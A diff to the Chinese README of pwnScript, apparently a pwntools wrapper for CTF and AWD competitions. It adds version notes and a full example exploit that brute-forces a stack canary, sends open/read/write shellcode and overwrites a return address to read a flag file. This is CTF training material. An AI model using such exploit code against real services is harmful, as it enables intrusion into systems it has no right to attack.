@@ -30,6 +30,8 @@
 
 
 
+## 版本信息
+
 目前（2.1.1）有的功能：
 
 - 对pwntools常用命令封装如：send，recv，interactive等
@@ -61,7 +63,14 @@
 2.1.4新增功能：
 
 - 使用`pwnScript new exp.py --name ckyan`生成初始化脚本，主要是一些基本信息和注释之类的。
-- 修改了无法使用`pwnScript debug --file ./pwn`直接交互的bug。
+- 修复了无法使用`pwnScript debug --file ./pwn`直接交互的bug。
+
+
+
+2.1.5新增功能：
+
+- 增加了对canary逐字节爆破的功能，（仅限有的题目考点，如果题目canary损坏直接退出就不行了）
+- 修复了无法使用`pwnScript remote -u "127.0.0.1 9999"`直接交互的bug。
 
 
 
@@ -218,7 +227,7 @@ if __name__ == '__main__':
 
 ## 示例
 
-栈溢出利用，
+### 栈溢出利用
 
 ret2libc
 
@@ -424,7 +433,7 @@ if __name__ == '__main__':
 
 
 
-awd示例：
+### awd利用
 
 ```bash
 python exp.py auto
@@ -509,6 +518,78 @@ if __name__ == '__main__':
         exploit=exp)
     
     awd.attack(print_flag=True, send_flag=False, save_flag=True)
+
+```
+
+
+
+### 爆破canary利用
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+"""
+Author: ckyan
+Generation date: 2024-06-24 13:48:16
+"""
+
+"""
+GitHub:
+    https://github.com/c0mentropy/ckyan.pwnScript
+Help: 
+    python3 exp.py --help
+    python3 exp.py debug --help
+    python3 exp.py remote --help
+Local:
+    python3 exp.py debug --file ./pwn
+Remote:
+    python3 exp.py remote --ip 127.0.0.1 --port 9999 [--file ./pwn] [--libc ./libc.so.6]
+    python3 exp.py remote --url 127.0.0.1:9999 [--file ./pwn] [--libc ./libc.so.6]
+"""
+
+# ./exp.py de -f ./guess
+# ./exp.py re -f ./guess -u ""
+
+from ckyan.pwnScript import *
+
+def exp():
+    pandora_box.init_script()
+
+    elf = pandora_box.elf
+    libc = pandora_box.libc
+    p = pandora_box.conn
+
+    shellcode = shellcraft.open('./flag')
+    shellcode += shellcraft.read(3, 0x404078, 0x30)
+    shellcode += shellcraft.write(1, 0x404078, 0x30)
+    
+    sl(asm(shellcode))
+
+    padding = 0x20 - 8
+
+    canary_attacker = Canary()
+
+    canary_attacker.find_full_canary(padding=padding,
+                                     send_after_str=b'thinking?(0-1000):\n')
+    
+    canary = canary_attacker.value
+
+    log_canary(uu64(canary))
+
+    pad = b''
+    pad += b'a' * padding
+    pad += canary
+    pad += b'a' * 8
+    pad += p64(0x40404000)
+
+    ru(b'In what number I am thinking?(0-1000):\n')
+    s(pad)
+
+    pattern_flag_from_data(b'flag', ra())
+
+if __name__ == '__main__':
+    exp()
 
 ```
 
